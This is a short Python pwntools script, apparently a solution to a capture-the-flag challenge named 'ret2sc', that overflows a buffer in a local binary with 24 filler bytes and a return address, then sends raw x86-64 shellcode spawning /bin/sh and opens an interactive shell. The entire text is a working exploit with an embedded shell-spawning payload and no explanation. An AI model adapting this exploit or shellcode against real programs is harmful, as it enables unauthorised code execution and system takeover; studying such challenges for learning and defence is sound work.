from pwn import *

p = process( './ret2sc' )

payload = b'A' * 24 + p64( 0x0000000000601080 )

p.recvuntil( '> ' )
p.sendline( payload )

p.recvuntil( '> ' )
p.sendline( b'\xeb\x18H\xc7\xc0;\x00\x00\x00H\xc7\xc6\x00\x00\x00\x00_H\xc7\xc2\x00\x00\x00\x00\x0f\x05\xe8\xe3\xff\xff\xff/bin/sh\x00' )

p.interactive()
